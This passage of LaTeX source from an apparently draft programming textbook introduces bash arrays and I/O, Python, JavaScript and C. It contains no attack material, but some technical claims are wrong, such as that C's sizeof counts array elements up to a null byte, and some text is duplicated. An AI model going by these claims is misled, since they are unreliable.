<name>=(<first> <second>) #create an array containing <first> and <second>
<name>=([0]=<first> [23]=<second> [n]=<nth>) #create an array, placing items in specific positions. 
<name>=(*.png) # create an array containing the filenames of every .png file in the current directory. 
			\end{lstlisting}
			\label{code:ArrayCreationBash}
			\caption{Array Creation in bash}
			\end{code}

			Arrays are used in much the same manner, with a few instances of syntactic sugar to make them easier. 
			To iterate through an array, the following for loop will extract each element and run a command using it. 
			\begin{code}
			\begin{lstlisting}[language=bash]
for <var> in "${<array>[@]}"; do
	<command using <var>>
done
			\end{lstlisting} 
			\label{code:ForEachArrayAccess}
			\caption{Accessing Arrays using For Each in Bash}
			\end{code}
			This will iterate through the array, item by item and run <command> using <var> as an arguement. 
			The quates around ``\$<array>[@]'' ensure that bash doesn't attempt to wordsplit the items within the array before they are placed in <var>.
			This expansion can be implemented anywhere that having multiple of the arrays items would work, such as within a cp command to copy all the items within the array into another folder. 

			Another method of accessing an array is using a singular index. 
			This, like those of most programming languages is a zero based method of getting one item out of the array. 
			To use this method, use the same syntax used to access the array within the for loop, replacing the ``@'' with either an integer or an integer variable. 
			In a similar manner, the \** symbol can be used as the index to concatenate every element in the array into one string. 

			More recent versions of bash also have a dictionary like array type called associative arrays. 
			These allow you to map one string to another, and are created and accessed in the following manner. 
			\begin{code}
			\begin{lstlisting}[language=bash]
declare -A <name>
	<name>=( [<map>]=<value> )
<command> ${<name>[<map>]}
			\end{lstlisting}
			\label{code:DeclareAssociativeArrayBash}
			\caption{Declaring Associative Arrays in Bash}
			\end{code}

		\subsection{Input and Output}
			There are a number of different places in which IO can occur within a bash script. 
			These range from the normal, such as command line arguments and files, to the unusual, such as environmental variables and pipes. 
			This section will enable you to understand how mast types of bash IO work and implement them in your scripts. 

			The most simple means of allowing input to your script is by using command line arguments. 
			This can be done by using the positional parameters which are shown in the variables section above. 
			Using these, each argument given will be placed into its respective parameter, starting from 0 being the command used to call the script. 
			These can be called like any variable within your script: ``\$n''.
			In addition to this, you can call the array of all positional variables using ``"\$@"''. 
			This will expand all arguments which were given to the script. 
			A final method, known as ``shift'', will push the arguments forward, popping the contents of ``\$1'' off the stack and moving ``\$2'' up into its place. 
			This is useful within loops, as you can use ``\$1'' as a variable representing all arguments one at a time. 

			Another means of input to your script is the environmental variables which it inherits from the invoking bash environment. 
			These will contain useful items such as the binary paths of the system and the language that the user wants to use. 
			An example of this, is checking whether the computer is being used with an X display manager and whether the user has set their preferred terminal.  
			This can be done with the following code:
			\begin{code}
			\begin{lstlisting}[language=bash]
if [[ $DISPLAY ]]; then
	if [[ $TERM_PROGRAM ]]
		<Command to run in preferred terminal>
	else
		<Command to run in xterm>
	fi
else
	<Command to run in CLI>
fi
			\end{lstlisting}
			\label{code:checkingEnvironmentalVariables}
			\caption{Acting based on environmental variables}
			\end{code}
			Finally, environmental variables can be used as output to any programs that you invoke within your script. 
			This can be done by using the export command, with the same syntax as assigning a variable after it. 
			
			Once the script has been invoked, IO can be done by the same means as most CLI programs. 
			Reading from STDIN is done by using the command read -p, which takes a string to display and the name of a variable to place the input into. 
			This will work in exactly the same manner as python's raw input, writing the line to the CLI and storing every input before the new line in the variable you give it. 
			Output can be done using a number of commands. 
			However, the two most common are echo for simple output and printf for formatted strings. 
			Both of these commands are simple, with echo simply outputting a string to STDOUT and printf working exactly the same as in C. 
			In both of these cases, if you want to change the input the ``<'' operator will allow you to. 
			For changing output, use either the ``>'', ``>{}>'' or ``>\&n'' operators, where n is a file descriptor, such as the standard ones found in table \ref{tab:stdFileDescriptors}
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{|l|l|l|}
					\hline
					\textbf{Number} & \textbf{Name} & \textbf{Description} \\ \hline
					0 & STDIN & Standard input for a program. Usually text entry at the commandline. \\ \hline 
					1 & STDOUT & Standard output for a program. Usually text output at the commandline. \\ \hline
					2 & STDERR & Standard error output for a program. Usually also the commandline. \\ \hline
				\end{tabular}
				\end{adjustbox}
				\caption{Standard File Descriptors}
				\label{tab:stdFileDescriptors}
			\end{table}
					
		\subsection{Compound Commands}
			These are commands or syntax elements which allow you to alter the scope or operation of the script you are writing. 
			Each of these work slightly differently, but when used together and properly, they allow for a properly written program using scope and functions. 

			Subshells similar to creating a child process, but with slightly more inherited. 
			They are commonly created through the use of syntax such as pipes, but can be manually called using parenthesis. 
			This allows us to create a part of the script which will not effect other parts. 
			Commands within a subshell can fail and will only exit the current subshell. 
			Furthermore, commands which change the current environment of the shell such as ``cd'' will not retain their changes outside the subshell. 

			A similar notion with respect to redirection and flow exists in command grouping. 
			This is done using the braces ``\{'' and ``\}'' around the commands that you wish to group, and will cause all redirection at the end of the braces to apply to everything within them. 
			While these may seem like a subshell, the commands within this grouping are executed within the same shell as the commands around them. 
			Thus, changes are retained when exiting the group. 

			Functions within a bash script can be thought of as mini scripts. 
			These execute in the same shell, but can be given arguments and be called whenever needed from within the script. 
			Parameters within the function can be called in the same means as parameters to the whole script, however, these are not the same parameters as the script originally received. 
			The main use for a function is to pull a commonly repeated block of code out, causing it to be written only once and simply called from each location it is required from. 
			Functions also limit the scope of the script within them. 
			Variables created within them will not be accessible outside the function. 
			Functions are defined and called in the following manner:
			\begin{code}
			\begin{lstlisting}[language=bash]
<Function Name>() {
	<commands>
}
<Function Name> <Parameters>
			\end{lstlisting}
			\label{code:bashFunctions}
			\caption{Functions in Bash}
			\end{code}

		
			Aliases are the final compound command. 
			These allow you to create or change a name for either an altered command or a string of commands. 
			They work in a similar manner to a find and replace search in that any time you type the name you give the alias it will be replaced with exactly what you enter as the alias' command. 
			An example of creating an alias for ls to ensure it outputs in colour is shown below. 
			\begin{code}
			\begin{lstlisting}[language=bash]
alias ls="ls --color=auto"
			\end{lstlisting}
			\label{code:bashAlias}
			\caption{Aliasing in Bash}
			\end{code}
	\section{Introduction to Python}
		Python is the first, easiest and most useful language that will be introduced in this book.\cite{PythonBoringStuff} 
		At a basic level, it looks like a language that was not built for complex programming, but rather one that should be used to learn. 
		However, this couldn't be further from the truth. 
		Due to it's integration with the Open Source community, python has grown beyond the basic language that it would initially seem. 
		This has occurred through the introduction of modules and tools such as pypi, which allow you to find new modules based on their description. 
		\subsection{Setup}
			To use this section, you will have to have installed python 3 on your system. 
			On a Linux system, this can usually be done by running your package manager. 
			On any other system, it is recommended that you find the package on \url{python.org}.

			Once this is installed, the python interpreter can be run by calling ``python'' from the command line. 
			You can call this interpreter with a file name as an argument to have it interpret and run that file. 

		\subsection{Your First Program}
			The below program is an example of a ``Hello World'' program in C. 
			These are generally the basic program that is used as the first that a new programmer will write in a language. 
			Because python is a high level language that focuses on being accurate and concise, this program can be expressed in the following line. 
			\begin{quote}
				print("Hello World");
			\end{quote}

		\subsection{Mathematics}
			While programming does not require high level mathematics, it is heavily based on basic arithmetic. 
			Table \ref{tab:PythonMaths} contains a list of the mathematical operators that can be used in python, their symbolic equivalent and their end state. 
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{|c|c|c|c|}
					\hline
					\textbf{Python Command} & \textbf{Mathematical Operator} & \textbf{Example} & \textbf{Returns} \\ \hline
					+ & $+$ & 1 + 5 & 6 \\ \hline
					- & $-$ & 5 - 1 & 4 \\ \hline
					* & $\times$ & 4*3 & 12 \\ \hline
					/ & $\div$ & 4/2 & 2 \\ \hline
					%\% & $\mod$ & 5 \% 4 & 1 \\ \hline 
					= & $=$ & x = 7 & x holds the value 7 \\ \hline 
				\end{tabular}
				\end{adjustbox}
				\caption{Python Arithmetic operators}
				\label{tab:PythonMaths}
			\end{table}
	\section{Introducton to JavaScript}
		%TODO: Clean up this section. 
		Javascript is the programming language of the Internet. 
		It was originally built in 1995 to allow for programming on a web page. 
		% Dave flanagan's definitive guide to javascript. 
		It is also worth noting that Javascript is a functional language\cite{JSProgrammingLanguage}
		It is based on creating functions which are then extended upon in functions which then call those. 

		\subsection{Origins}
			Javascript started as Livescript, a language started by Netscape in order to write programs for the web. 
			It's main goal was to be able to write cross platform programs which could be written and used on the web. 
			This was done in order to allow non-Microsoft OS's to run programs. 

			Netscape then joined with Sun Microsystems to make Javascript. 
			This was then made into a standard in order to stop other companies from altering the program. 
			However, a number of problems were implemented into this standard and continue to this date. 
		\subsection{Key Differences}
			\begin{description}
				\item[Load and go delivery:] Programs are delivered as source code. 
					This is because it was intended to be embedded into web pages. 
				\item[Loose Typing:] This allows better expression of ideas,
					but is not as strict, making it less likely that a compiler will find errors. 
				\item[Objects as Containers:] This is the unification of objects and hash tables.
					This allows new methods and members to be added at any time. 
				\item[Prototypal Inheritance:] Objects inherit directly from other classes. 
					This can be difficult when coming from traditional Object Oriented languages, but can be powerful. 
				\item[Lambda:] This is a functional notion that allows functions to be used as first class objects. 
				\item[Linkage through Global Variables:] Due to the load and go model there is no linker. 
					This means that compilation variables are created with a global scope. 
					This is horrid for security. 
			\end{description}
		\subsection{Types}
			Javascript has a number of types which are similar to those in other languages. 
			However, as this is a loosely typed language, they need not be specified. 
			\begin{itemize}
				\item Numbers
				\item Strings
				\item Boolean
				\item Objects
				\item Null
				\item Undefined
			\end{itemize}
			There are no different types of numbers. 
			Instead, this is purely a double precision floating number. 
			This must be taken into account when programming. 
			For example, division between two integers can produce a non-integer number. 

			There is also a special type known as NaN or Not a Number. 
			This is a type of undefined and will continue through any arithmetic that is done on it. 
			This means that a NaN anywhere through the expression will end in NaN. 
			NaN is also not equal to anything. 
			Thus $NaN \ne NaN$. 
			
			Strings can be turned into a number using the ``Number'' Function. 
			However, if this cannot be done, it will return NaN. 
			Similarly, there is a parseInt function which can be used. 
			However, this should always be used with a radix. 
			Otherwise it will try to determine the radix itself and can fail in interesting ways. 

			Strings are always encoded in the 16 bit UCS-2. 
			This is because Javascript was created before UTF-16 became mature. 
			This is usually not a problem, but can be if you need the extra characters. 

			Strings are immutable in Javascript. 
			This means that the strings cannot be modified but rather have to be recreated. 
			However, concatenation will do this automatically. 

			Similar strings are equal with ``==''. 
			Furthermore string literals can be created with either single quotes ('String') or double quotes ("String"). 
			Strings also have a length variable which contains the number of 16 bit characters stored within it. 

			The string function can be used to turn a number into a string. 
			Strings are objects and thus have a number of methods for substrings or other functions. 

			Boolean can either be true of false. 
			There are also functions which can be used to determine whither something is near true or false. 
			Values similar to false are:
			\begin{itemize}
				\item False
				\item Null
				\item ""
				\item Undefined. 
				\item 0
				\item NaN
			\end{itemize}
			All other values are true. 
			However, ensure that you check you aren't checking for the string ``0'' or the string ``false''. 

			Null means no value. 
			Undefined is the default value for a variable. 
			This is also the value given when you try to extract a member that doesn't exist from an object. 
			
			It is also worth noting that any variable can receive any type of value. 
			This includes parameters an return values. 
			
			All key words are lower case and case sensitive. 
		\subsection{Objects}
			Objects in Javascript are dynamic. 
			This is due to the fact that the ``new'' command produces an empty container of name-value pairs.
			In this, the name can be any string and the value can be anything other than undefined. 
			At this point, members can be added. 
			
			Object members can be accessed through the traditional `` . '' notation. 
			These members can also be accessed through a subscript notation as follows:
			\begin{quote}
				object[key]
			\end{quote}
			Furthermore, the ``\{\}'' braces are used to create a new empty object. 
			Alternatively, you can use the ``new Object()'' command or 
			use the object function as ``object(Object.prototype)''

			Objects are created with a number of key-value pairs stored within them. 
			This is done by having a key (which can be, but doesn't have to be a string) followed by a value. 
			For example:
			\begin{quote}
				KVP : "This is a key-value pair"
			\end{quote}
			 
			Objects can also be created using object literals. 
			This allows you to create an object in place and work with it.
			For example:
			\begin{code}
				\lstinputlisting[language=JavaScript]{./ObjectLiteral.js}
				\caption{A basic Javascript Object Literal}
				\label{code:JSObjectLiteral}
			\end{code}
			It is also worth noting that this is the same format used in JSON. 
			These can be used anywhere that a on object could be used. 
			These can be used for creating named parameters in functions. 

			Objects can also be augmented at any time. 
			This means that you can assign a new key-value pair to the object. 
			If the key did not previously exist, it will be created. 

			Inheritance works by creating a link between the main object and the one it inherited from. 
			If an attempt to access a key within an object fails, it will run down this inheritance chain. 
			Only if no object down this chain has a key with the same name will it return undefined. 
			
			Objects are always passed by reference, rather than value. 
			Thus, the ``==='' operator will tell you whether the references are the same. 

			You can also delete a key from an object. 
			This is done using the delete command as ``delete theObject[key];''. 
			This will change the keys value to undefined. 
		\subsection{Arrays}
			In Javascript, arrays will inherit from objects. 
			This means that the arrays are key-value pairs. 
			Thus, Javascript arrays are only efficient for sparse arrays, but not for most normal arrays. 

			Arrays have a length member which will give you 1 more than the highest integer subscript. 
			This may be the same as the length of the array, but may not be. 

			Array literals can be written in a similar manner to the object literal. 
			These look as follows:
			\begin{verbatim}
list = ['one', 'two', 'three'];
			\end{verbatim}
			Furthermore, arrays can be appended at any time as they do not have normal bounds. 

			Arrays have the following members:
			\begin{itemize}
				\item concat
				\item join
				\item pop
				\item push 
				\item slice
				\item sort
				\item splice
			\end{itemize}

			Members are deleted in the same way as for objects. 
			However, this will leave a hole in the array. 
			Thus, the splice method should be used to move the values down to fill the hole. 

			Because objects and arrays are similar, it can be hard to decide between them. 
			Thus, use objects when you need a key-value pair. 
			Use arrays when you need sequential ordering. 

			You can also assign new methods to an array. 
			This can be done on an array by array basis, or by assigning them to array.prototype, 
			which will assign them to all arrays. 
		\subsection{Syntax}
			Javascript follows the basic syntax rules of C. 
			This means that the basic brace rules, as well as loops and statements follow the same rules as C. 
			However, there are a number of differences, mainly due to the functional nature of Javascript. 
			This is most evident in it's allowance of functions to be values. 

			Everything except for constructors should start with a lower case letter by convention. 
			The initial underscore should be reserved for implementations. 
			These are usually used for internal variables. 
			The \$ is used for macros in the standard. 
			However, this is not always adhered to within the community. 

			Reserved words are as follows:
			\begin{multicols}{3}
				\begin{itemize}
					\item abstract
					\item boolean
					\item \textbf{break}
					\item byte
					\item debugger
					\item \textbf{default}
					\item \textbf{delete}
					\item \textbf{do}
					\item double
					\item \textbf{else}
					\item enum
					\item export
					\item export
					\item extends
					\item \textbf{false}
					\item final
					\item \textbf{finally}
					\item float
					\item \textbf{for}
					\item \textbf{function}
					\item goto
					\item \textbf{if}
					\item implements
					\item import
					\item \textbf{in}
					\item \textbf{instanceof}
					\item int
					\item interface
					\item long
					\item native 
					\item \textbf{new}
					\item \textbf{null}
					\item package
					\item private
					\item protected
					\item public
					\item \textbf{return} 
					\item short
					\item static 
					\item super
					\item \textbf{switch}
					\item synchronized
					\item \textbf{this}
					\item \textbf{throw}
					\item throws
					\item transient
					\item \textbf{true}
					\item \textbf{try}
					\item \textbf{typeof}
					\item \textbf{var} 
					\item volatile
					\item \textbf{void}
					\item \textbf{while}
					\item \textbf{with}
				\end{itemize}
			\end{multicols}
			Reserved words that are used within the language are highlighted in bold. 
			However, most of this list was created to avoid confusion when coming from other C-like languages. 

			Commenting works in the normal C style. 
			As do most operators. 
			The plus sign is used for both addition and concatenation. 
			This can be the cause of a number of issues due to the loosely typed nature of the language. 
			The plus sign will also convert a string into a number. 

			The ``$==$'' and ``$!=$'' work mostly as expected but will do type cohesion. 
			For exact equality, use the ``$===$'' or ``$!==$''. 

			The logical and operator works differently to those in other languages. 
			If the first operand would evaluate to true, it will return the second.
			Otherwise, it will return the first. 
			This can be used to avoid null references. 

			Conversely, the OR operator will return the first operand if it evaluates to true. 
			Otherwise it will return the second. 

			Bitwise operators exist. 
			They convert the number from float to int, then conduct the operation. 
			However, this means that they are far slower for operations that don't need a bitwise operation. 

			Javascript also has the ability to create a labeled break. 
			This means that if you have a number of nested loops, you can break out of all of them, or just the first two. 
			This is done by putting a label at the end of the loop that you wish to break out of. 

			While the for loop can be used in the normal manner, 
			there is also another for construct which allows you to iterate through the members of objects. 
			In this case, the loop will be constructed giving a name and an object. 
			In each iteration of the loop, name will be equal to one of the keys for the given object. 
			However, this will also go through all keys of all objects that the given object inherits from. 
			To solve this, at the start of the loop check that the object you gave has the property given by name. 
			%TODO: Add in code here. 

			The switch statement can work with strings, allowing you fork based on string input. 
			Furthermore, the case statements can test against variables rather than the usual constant requirement. 
			Remember that you still have to break at each statement. 

			Unlike C, Javascript has exceptions. 
			These can be created by creating a new exception, or by creating one in place. 
			%TODO: more detail. 
			These exceptions can be caught within a try-catch block. 
			However, because there are no classes, there can only be one catch block. 
			This means that the single catch block must determine what type of exception was thrown and how to act with it. 

			There is also a function statement used for declaring a function. 
			This, as with most other languages expects a name, a set of parameters and the code block for the function to execute. 
			This is quite similar to the ``def'' statement in Python. 

			There is also the var statement, which is used to declare a variable. 
			This is used instead of the type in languages like C. 
			Types will be determined based on the values given to the variable.
			However, if a value is not given, Javascript will initialise it to ``undefined''. 

			Unlike most C-like languages, blocks do not have scope. 
			Thus, only functions have scope. 
			This means that creating a variable within a code block such as a loop will create it for the whole function. 
			Furthermore, creating the same variable twice within a scope will not raise an error. 

			Further to this, Javascript has implied globals. 
			This means that if you forget to declare a variable, then use it, 
			rather than raising an error, Javascript will simply use it as a global variable. 

			Every function will return something. 
			Functions that do not explicitly return something will return undefined. 
			Constructors will always return the newly created object. 

		\subsection{Functions}
			The function operator is used to created a new function. 
			However, this can be used in any location within the program. 
			This means that you can pass a function to another function as an argument. 
			Furthermore, this means that you can store a function in a variable.
			The function statement is simply a shorthand which creates a variable named with the same name as the function. 
			Furthermore, functions can be defined within other functions. 

			Scope is defined based on functions. 
			This means that the inner function will have access to the variables of the outer function. 
			Thus, functions are commonly used to limit scope within the program. 

			It is also worth noting that functions are objects, meaning that they can contain key-value pairs. 
			Similarly, objects can contain functions. 

			Rules when invoking functions:
			\begin{itemize}
				\item If a function is called with too many arguments, the extra ones are ignored. 
				\item If a function is called with too few arguments, the missing values will be undefined. 
				\item There is no implicit type checking. 
			\end{itemize}
			
			There are numerous ways to call a function:
			\begin{enumerate}
				\item Method form: This is a function within an object. 
					It is called as ``object.method''. 
					This will also allow the function access to the object that it was called from. 
				\item Function form: This will call a function directly. 
					It will bind ``this'' to the global object variable. 
				\item Constructor form: The new operator assigns the new object to this. 
			\end{enumerate}

			Functions are further given an object called arguments. 
			This will contain the arguments given to the function, no matter whether they were expected or not. 
			This provides a manner for giving a variable set of arguments. 

			The ``eval'' function is a common cause of security flaws. 
			This was created in order to allow the browser to execute arbitrary scripts from external sources. 
			For this exact reason, ``eval'' should be avoided. 
	\section{Introduction to C}
		To many people, C is a scary language that causes Segmentation Faults and allows numerous mistakes. 
		However, C is not the cause of this. Simply the tool that allows programmers to make these mistakes. 
		Thus, understanding and correctly using C is about knowing how the computer itself works and ensuring that you work within that. 
		C will allow you to go past memory bounds. 
		C will allow you to write code that will crash on every call. 
		It C, it is your job to ensure that this doesn't happen. 
		This is all because C is little more than one step above assembly. 
		It refuses to hide what is actually going on with the computer. 

		\subsection{Setup}
			To use this section you will have to set your computer up to write and compile code. 
			I suggest that you find and learn a proper text editor such as VIM (which is explained in the above section on the CLI).
			This will allow you to write C, but also compile and run it from within your editor. 
			However, I recommend that you do not use an IDE when first learning. 
			This will create poor habits such as relying on code completion and highlighting rather than understanding and paying attention to your writing. 

			Furthermore, you will have to install make and GCC or the relevant compiler for your OS. 
			I will leave these details to you, as each system has a slightly different implementation of these tools. 

		\subsection{Your First C Program}
			Code example \ref{code:FirstProgramC} is an example of a ``Hello World'' program in C. 
			This is the most basic form of C programming, as it only uses the main function and one standard library. 
			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./first.c}
				\caption{A Simple Hello World Program in C}
				\label{code:FirstProgramC}
			\end{code}
			This program will now be explained line by line. 
			\begin{enumerate}
				\item Preprocessor declaration to include the standard IO library in the file. 
				\item Blank line for formatting. 
				\item Main function declaration. 
					This creates the entry point for the program as well as creating the argument counter and argument value variables. 
					These will be explained later. 
				\item Opening brace to set the bounds of the main function. 
				\item Printf statement, calling the C STDIO library printf function to print to the console. 
				\item Return statement, telling the program to exit the main function with a value of 0. 
					The meaning of this will be explained later. 
				\item Closing brace for the main function. 
			\end{enumerate}
		\subsection{Compiling}
			C requires that it is compiled before use. 
			Thus, one must learn both the language and the complier that is used for it. 
			Furthermore, in C, a tool known as make is used to run numerous or complex compiler functions. 
			Code example \ref{code:Makefile} contains a complex setup for compiling moderate sized C programs. 
			It will have to be altered for the specific program structure, but it will be a good starting point. 
			For smaller programs, use the makefile in code example \ref{code:BasicMakefile}.

			\begin{code}
				\lstinputlisting[language={[gnu]make}]{./makefile}
				\caption{A Basic Makefile}
				\label{code:BasicMakefile}
			\end{code}

			\begin{code}
				\lstinputlisting[language={[gnu]make}]{./make}
				\caption{A Complex Makefile}
				\label{code:Makefile}
			\end{code}


			Go through the settings within this. 
			It is far more complex than the simple make files that you will need for this section. 
			However, it gives you an insight into what is required for creating a Makefile for a large project.
			\FloatBarrier
		\subsection{Printing}
			There are a number of ways to print to the commandline within C. 
			However, the most common one is to use the ``printf'' function from STDIO. 
			This function takes a string and a variable number of arguments to substitute into the string. 
			This allows for inserting variables into the string to be output to the user. 
			Sadly, this can be abused, allowing the user to insert their own commands into the strings as seen in \ref{ch:BinaryExploitation}

			A list of the format strings can be found in \ref{tab:StringFormatCodes}
				\begin{table}[htb]
					\centering
					\begin{adjustbox}{max width=1\textwidth}
					\begin{tabular}{| l | l |}
						\hline
						\verb+%d+ & Int \\ \hline
						\verb+%f+ & Floating point number. \\ \hline
						\verb+%X+ & Hex. \\ \hline
						\verb+%o+ & Octal. \\ \hline
						\verb+%s+ & Null terminated string. \\ \hline
						\verb+%c+ & Character \\ \hline
						\verb+%p+ & Void Pointer \\ \hline
						\verb+%n+ & Write number of chars printed to int pointer. \\ \hline
						\verb+%d+ & Int \\ \hline
					\end{tabular}
					\end{adjustbox}
					\caption{Types of Format String Codes}
					\label{tab:StringFormatCodes}
				\end{table}
			For more information on this, see \href{http://linux.die.net/man/3/printf}{man 3 printf.}
		\subsection{Memory Testing with Valgrind}
			Unlike Python or Java, C does not have the same memory constraints or bounds checking. 
			Thus, a program known as Valgrind has been created in order to check programs for memory leaks and the like. 
			It works by running the program within itself, checking for memory allocation and deallocations and ensuring that all memory is correctly handled. 

			This is not the be all and end all of writing memory leak free C code, but it is a good start. 
		\subsection{Variables and Types}
			While Python has types, you as the programmer don't get to use them. 
			C on the other hand, likes to give everything to the programmer, and thus requires you to choose the type that you would like for each variable. 
			Thus, you will have to understand the differences between the different types and where they are best used. 
			Table \ref{tab:CVariableTypes} contains a list of the most common variable types. 
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
				\begin{tabular}{| l | p{8cm} |}
					\hline
					\textbf{Type} & \textbf{Explanation} \\ \hline
					char & A single byte used to store an ASCII character \\ \hline\hline
					short & An integer at least 16 bits in size. \\ \hline
					int & An integer at least 16 bits in size. \\ \hline
					long & An integer of at least 32 bits in size. \\ \hline
					long long & An integer of at least 64 bits in size. \\ \hline\hline
					float & A precision floating point (decimal) number. \\ \hline
					double & A double precision floating point number. \\ \hline
					long double & An extended precision floating point number. 
					May be the same as a double if the extended precision is not supported. \\ \hline
				\end{tabular}
				\end{adjustbox}
				\caption{C Variable Types}
				\label{tab:CVariableTypes}
			\end{table}
			There also exist other types, such as pointers, structs and unions. 
			However, these are more advanced and will be covered at a later point. 

			It is also worth noting that these variables can be used in math and other similar operations. 
			The symbols are much the same as in normal mathematics with the following differences:
			\begin{description}
				\item[Equals] is done through the ``=='' operator.
				\item[Assignment] is done through the ``='' operator.
				\item[Multiplication] is done using the ``*'' operator.
				\item[Division] is done using the ``/'' operator. 
			\end{description}

		\subsection{Arrays}
			Arrays in C are barer than those of other languages. 
			For example, unlike in Java, they do not come with a precalculated length variable.
			Furthermore, if they are being used as a string, they need to be null terminated so that compiler knows where the array ends. 
			A list of basic array syntax can be found in code example \ref{code:CArrays}.
			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./arrays.c}
				\caption{A List of Different Array Syntax}
				\label{code:CArrays}
			\end{code}
			It is also worth noting that C can have multi-dimensional arrays. 
			This is done by creating an array of pointers using the syntax ``int *arr[]'' for an integer array. 
			For another example of this, see the ``*argv[]'' variable in the arguments of every C programs main function. 
			This creates an array of strings (or char arrays) which hold the arguments given to the program on execution. 

			To find the size of an array, the contents within it must be counted until a null byte is found. 
			However, you will not be required to do this manually. 
			C comes with a function known as ``sizeof'' which will do this for you when called on an array. 
		\subsection{Loops}
			Just like in Python, C has a number of loops built into it. 
			These loops will work exactly the same as the basic python versions, but will have a slightly different syntax. 
			
			The ``while'' loop is the most basic loop within C. 
			It is used to check a condition and continue looping while that condition is true. 
			An example of the syntax of a while loop can be seen in code example \ref{code:CLoops}

			The more complex ``for'' loop is the most common loop in programming. 
			It is used to iterate through a known set, such as an array. 
			This loop is far more like the basic for loop in Python, rather than the for each that has recently come into usage. 
			An example of the syntax of the for loop can be found in code example \ref{code:CLoops}
			
			Both of these loops require that the expression given to them can be interpreted with boolean logic. 
			In C, this means that it will either give an obvious true or false answer, or it will equate to an integer (zero being false, non-zero being true).

			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./CLoops.c}
				\caption{Examples of Basic C Loops}
				\label{code:CLoops}
			\end{code}
		\subsection{Conditional Statements}
			In a similar way to loops, the if statement in C is quite similar to that of python. 
			It has a condition, a code block and can have else if and else statements under it. 
			However, the difference comes into the syntax. 
			If statements in C have their conditionals bound in parenthesis and their blocks bound in braces. 
			An example of this can be found in code example \ref{code:Cif}.

			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./if.c}
				\caption{Example of the C if statement}
				\label{code:Cif}
			\end{code}

			Another conditional within C is the switch statement. 
			This statement provides a means of writing actions based on a large number of options. 
			Thus, if you have a variable that could take a large but defined set of options and each needs to have it's own action, a switch would be more useful than an if statement. 
			Furthermore, it must be noted that within a switch the individual cases will drop down to the next below them unless the command ``break'' is given. 
			This can be useful if used intentionally, but is the most common cause of bugs when using switch statements. 
			An example of the syntax of a switch statement is given in code example \ref{code:CSwitch}

			Another conditional within C is the switch statement. 
			This statement provides a means of writing actions based on a large number of options. 
			Thus, if you have a variable that could take a large but defined set of options and each needs to have it's own action, a switch would be more useful than an if statement. 
			Furthermore, it must be noted that within a switch the individual cases will drop down to the next below them unless the command ``break'' is given. 
			This can be useful if used intentionally, but is the most common cause of bugs when using switch statements. 
			An example of the syntax of a switch statement is given in code example \ref{code:CSwitch}.

			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./CSwitch.c}
				\caption{Example of the C Switch Statement}
				\label{code:CSwitch}
			\end{code}
		\subsection{Functions}
			Functions are a way of repeating the same block of code---possibly with different variables---throughout your code. 
			They allow you do write an algorithm for doing something specific once, then use the same one everywhere. 
			This means that with proper naming, your code will be shorter and easier to read, while also having more chance of being bug free as you haven't written multiple different ways to do the same thing. 

			Functions in C are similar to those of most other languages. 
			However, when compared to languages like python, there are some minor differences, as seen in code example \ref{code:CFunction}.
			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./CFunction.c}
				\caption{Example of a C Function}
				\label{code:CFunction}
			\end{code}
			This is a function which will calculate the Fibonacci number sequence to the number of iterations given as an argument on the first line. 
			It then creates three variables (lines 2-4), initializing the first two (and thus completing the first iteration) while leaving the latter without a value. 
			We then create a for loop, which will have the function repeat the steps of the Fibonacci algorithm until it has reached the correct number of iterations. 
			Finally, on line 9, we tell the program to return processing to the function that called it, giving the value stored at fib. 
			It is worth noting that as we declared this function as an integer, it cannot return another variable type. 
			If we were to attempt to return a double, or an array of integers, it would not compile. 
			However, if you compile with no warnings on, some compilers will allow you to return a char, as in C a char is simply a small int that has a specific way of printing to screen. 
			Thus, you must be careful how you write C to ensure the behaviour is what you expected. 

		\subsection{Pointers}
			Pointers are the downfall of many programmers. 
			When used poorly, or when poorly understood, they can be the bane of your existence. 
			However, pointers are brilliant. 
			They allow you do do many things that cannot be done as easily in other languages. 
			They give you direct access to memory in a way that object types and other implementations do not. 
			Once you have started using pointers properly, you will be begging to have them back if you switch to a language like Java, which doesn't have them. 

			To understand pointers, it is best to understand how C thinks about memory. 
			To C, the computers memory is simply a huge array of bytes. 
			However, rather than requiring the programmer to remember the locations of their bytes, C allows you to use variables and types. 
			This means that each variable you write has a location that is used to retrieve it, and that location can be used to do different things. 
			For example, if you create an array ``arr'', you could then index it as ``arr[n]'', which will give you then nth value of arr. 
			However, you could also create a pointer to arr (``int *arr\_ptr = \&arr''). 
			This pointer it itself is an integer, you can do math on it to calculate different addresses. 
			However, when used, it can either be used as a reference or a value. 
			Calling ``arr\_ptr++'' then ``printf("\%d", *arr\_ptr)'' will print the second value stored in arr. 

			Basically, what is being said here is that while an array index (``arr[n]'') is a temporary memory reference, a pointer such as ``arr\_ptr'' is its permanent version. 
			An example of using a pointer can be found in code example \ref{code:CPTR}. 
			This example will use a pointer to create the Fibonacci sequence in memory, returning the pointer to the start of the sequence. 
			\begin{code}
				\lstinputlisting[language={[ANSI]C}]{./CPointers.c}
				\caption{Example of a C Pointers}
				\label{code:CPTR}
			\end{code}

			While pointers are exceptionally useful, there should not usually be used over arrays. 
			Pointers are great for things that arrays aren't, or for when you need raw access to a block of memory. 
			However, you are more likely to get pointers wrong, and the mistakes that you make will be far less obvious. 
			The difference between a dereferenced pointer and a reference can be far too subtle to grasp when working with what should be an array. 

			Thus, there are four things that a pointer would be the best choice for:
			\begin{enumerate}
				\item Ask the OS for a chunk of memory to work with. 
				\item Passing large blocks of memory to functions with a pointer rather than passing the whole thing. 
				\item Taking the address of a function to use it in a call later. 
				\item Complex scanning of chunks of memory such as parsing a file. 
			\end{enumerate}
			You may hear that pointers are faster than arrays. 
			This is a layover from older compilers. 
			In the modern world, this is not true, they are largely the same. 
			However, you may find another reason to use a pointer over an array. 
			If you think you are right, give it a go, the worst think you'll loose is time. 

			Found in table \ref{tab:PointerLexicon} is an explanation of the different terms of using pointers. 
			
			\begin{table}[htb]
				\centering
				\begin{adjustbox}{max width=1\textwidth}
